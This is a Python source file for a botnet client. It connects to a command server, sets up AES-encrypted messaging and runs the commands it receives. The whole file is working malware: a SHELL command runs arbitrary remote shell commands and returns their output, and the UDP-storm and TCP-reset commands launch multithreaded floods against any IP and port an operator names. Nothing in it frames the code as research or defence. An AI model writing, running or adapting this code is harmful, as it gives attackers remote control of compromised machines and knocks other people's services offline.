import base64,socket,threading
from Encryptor import AES_Encryption
import socket,struct,threading,os

banner = '\x1b[38;5;196mReply \x1b[38;5;197mfrom \x1b[38;5;198mKEY\x1b[38;5;255m=\x1b[38;5;198m%s \x1b[38;5;198mIV\x1b[38;5;255m=\x1b[38;5;198m%s\r\n%s\x1b[0m'

stop = 0

def TCP_RESET(s,size):
  global stop
  try:
   for _ in range(250):
    if stop == 1:break
    s.sendall(os.urandom(size)); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
   s.shutdown(socket.SHUT_RDWR); s.close()
  except:pass

def CNC(addr,size):
  global stop
  try:
     for _ in range(250):
      if stop == 1:break
      s = socket.create_connection(addr)
      threading.Thread(target=TCP_RESET,args=(s,size)).start()
  except Exception as e:print(e)

def UDP_ATTACK(s,size,addr):
    global stop
    try:
        for _ in range(2500):
         if stop == 1:break
         [s.sendto(os.urandom(size),addr) for _ in range(15)]
    except:
       pass

def SOC(addr,size):
  global stop
  try:
     for _ in range(250):
      if stop == 1:break
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      threading.Thread(target=UDP_ATTACK,args=(s,size,addr)).start()
  except:pass

IP = '127.0.0.1'
PORT = 1

def cryptor(key,iv,data,mode='enc'):
 crypt = AES_Encryption(key=key, iv=iv, mode=2)
 if mode == 'enc':
  return base64.b64encode(crypt.encrypt(data))
 else:
  try:
   a = base64.b64decode(data)
   try:return base64.b64encode(crypt.decrypt(a).encode())
   except:return base64.b64encode(crypt.encrypt(data))
  except:return base64.b64encode(crypt.encrypt(data))

def get_mykey():
 global PORT
 try:
  key = []
  while True:
   if PORT > 65535:return False; break
   while True:
    try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((IP,PORT)); break
    except Exception as e:print(e); PORT += 1
   s.send(b'ECHO AES256')
   data = s.recv(65536).decode()
   if data == 'AES256':
    s.send(b'AES256 CREATE')
    aes = s.recv(65536).decode().split('#')
    s.send(f'AES256 AUTH {aes[0]} {aes[1]}'.encode())
    s.send(f"AES256 TEST {cryptor(aes[0],aes[1],s.recv(65536),'dec').decode()}".encode())
    code = 0
    while True:
     a = s.recv(65536).decode()
     if not a:
      continue
     if a == 'PASSED':
      key = aes; code = 0; break
    if code == 0:break
    s.close()
   else:PORT += 1
  return key,s
 except Exception as e:print(e); return False,False

cache_command = []
cache_response = []

def process_cache(mode,cache,data,a):
 if data == a[0]:
     if mode == 'command':cache_command.append([data,cache])
     elif mode == 'resp':cache_response.append([data,cache])

def find_cache(mode,data,key):
 global cache_command,cache_response
 count = 0
 d = ''
 code = False
 code2 = cryptor(key[0],key[1],data,'dec')
 while True:
  try:
    if mode == 'command':
     d = cache_command[count]
    else:d = cache_response[count]
    if d[0] == data:code = d[1]; code2 = ''; break
    count += 1
  except Exception as e:print(e); break
 return [code,code2]

def process_resp(s,resp,key):
 com = find_cache("resp",resp,key)
 if com[0] == False:
    com.remove(com[0])
    if len(cache_response) != 0:
     for a in cache_response:
      threading.Thread(target=process_cache,args=("resp",com[0],resp,a)).start()
    else:cache_response.append([resp,com[0]])
 s.send(com[0])

def command(s,command,key):
 global cache_response,cache_command,banner,stop
 try:
  print(base64.b64decode(command).decode())
  com = base64.b64decode(command).decode().split(' ')
  if com[0].upper() == 'PING':threading.Thread(target=process_resp,args=(s,f'PONG',key)).start()
  elif com[0].upper() == 'CACHE_NOW':
    s.send(cryptor(key[0],key[1],banner%s(key[0],key[1],f'CACHE-RESPONSE={len(cache_response)}\r\n  {cache_response}\r\nCACHE-COMMAND={len(cache_command)}\r\n  {cache_command}'),mode='enc'))
  elif com[0].upper() == 'CACHE_CLEAR':cache_response.clear(); cache_command.clear(); threading.Thread(target=process_resp,args=(s,banner%s(key[0],key[1],f'\x1b[38;5;76m\r\nCOMMAND HAS BEEN CLEAR\r\nRESPONSE HAS BEEN CLEAR'),key)).start()
  elif com[0].upper() == 'SHELL':
   import subprocess
   result = subprocess.run(base64.b64decode(cryptor(key[0],key[1],com[1].encode(),'dec')).decode(), shell=True, capture_output=True, text=True)
   if result.returncode == 0:threading.Thread(target=process_resp,args=(s,banner%s(key[0],key[1],f'\x1b[38;5;76m{result.stdout}'),key)).start()
   else:threading.Thread(target=process_resp,args=(s,banner%s(key[0],key[1],f'\x1b[38;5;76m{result.stderr}'),key)).start()
  elif com[0].upper() in ['UDP-STORM','UDPSTORM','UDP_STORM']:
    if len(com) == 5:
     ip,port,thread,size = com[1], int(com[2]),int(com[3]),int(com[4])
     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{ip}\x1b[38;5;255m:\x1b[38;5;81m{port}'),key)).start()
     [threading.Thread(target=SOC,args=((ip,port),size)).start() for _ in range(thread)]
    else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196m{com[0]} <IP> <PORT> <THREAD> SIZE'),key)).start()
  elif com[0].upper() in ['STOP','END-ATTACK','END_ATTACK','END-ATK','CLOSE-ATK','CLOSE-ATTACK']:
   if stop == 1:
    threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mCurrent running . . .'),key)).start()
    stop = 0
   else:
    threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196mCurrent stop . . .'),key)).start()
    stop = 1
  elif com[0].upper() in ['TCP-RST','TCP_RESET','TCP_RST','TCP-RESET']:
    if len(com) == 5:
     ip,port,thread,size = com[1], int(com[2]),int(com[3]),int(com[4])
     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{ip}\x1b[38;5;255m:\x1b[38;5;81m{port}'),key)).start()
     [threading.Thread(target=CNC,args=((ip,port),size)).start() for _ in range(thread)]
    else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196m{com[0]} <IP> <PORT> <THREAD> SIZE'),key)).start()
  else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196mNot \x1b[38;5;197mFound \x1b[38;5;76m(\x1b[38;5;75m"\x1b[38;5;78m{com[0]}\x1b[38;5;75m"\x1b[38;5;76m)'),key)).start()
 except Exception as e:print(e)

def botnet():
 global cache_command,cache_response
 try:
  key,s = get_mykey()
  if key != False:
   while True:
    if len(cache_response) > 150:cache_response.clear()
    if len(cache_command) > 150:cache_command.clear()
    data = s.recv(65536)
    com = find_cache("command",data,key)
    if com[0] == False:
     com.remove(com[0])
     if len(cache_command) != 0:
      for a in cache_command:
       threading.Thread(target=process_cache,args=("command",com[0],data,a)).start()
     else:
      cache_command.append([data,com[0]])
    threading.Thread(target=command,args=(s,com[0],key)).start()
 except Exception as e:print(e); pass

botnet()
